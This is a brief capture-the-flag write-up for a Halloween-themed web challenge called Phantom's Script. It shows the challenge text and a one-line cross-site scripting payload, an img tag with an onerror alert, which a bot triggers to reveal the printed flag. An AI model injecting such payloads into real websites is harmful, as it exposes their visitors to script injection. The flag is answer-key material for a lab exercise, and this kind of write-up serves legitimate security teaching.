# Web - Phantom's Script

## Description

Note: Wait for the bot to trigger your payload. It might take around \~10 seconds. Every Halloween, an enigmatic blog emerges from the depths of the dark web—Phantom's Script. Its pages are filled with cursed writings and hexed code that ensnare the souls of unwary visitors. The blog's malicious scripts weave dark secrets into the fabric of the internet, spreading corruption with each click. Rumor has it that interacting with the site in unexpected ways can trigger hidden incantations. Will you dare to delve into this haunted scroll, manipulate the scripts, and purge the malevolent code before it claims more victims?

## Homepage

<figure><img src="../../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

## Attack

We just need to trigger xss and wait for 10 seconds

```javascript
<img src=x onerror="alert('Boo!')">
```

<figure><img src="../../../../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

`HTB{xSS-1S_E4SY_wh4t_d0_y0u_th1nk?_2b88ce435772eda79f42654fe0651d27}`\
\
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning
